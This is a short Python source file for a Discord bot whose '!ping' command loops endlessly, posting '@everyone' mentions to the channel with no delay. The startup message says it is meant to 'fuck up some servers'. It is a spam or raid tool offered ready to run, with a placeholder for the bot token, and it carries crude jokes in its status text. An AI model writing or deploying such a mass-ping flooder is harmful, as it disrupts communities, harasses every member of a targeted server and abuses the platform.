import discord
import time
from discord.ext import commands

bot = commands.Bot(command_prefix = '!')
start = False

@bot.event
async def on_ready():
    print('ready to fuck up some servers')
    await bot.change_presence(activity=discord.Game(name="with your mum"))

@bot.command()
async def ping(ctx):
    start = True
    
    while start == True:
        await ctx.send("@everyone")
        time.sleep(0.)


bot.run('[Replace this with your discord bot token [Keep it private!]')
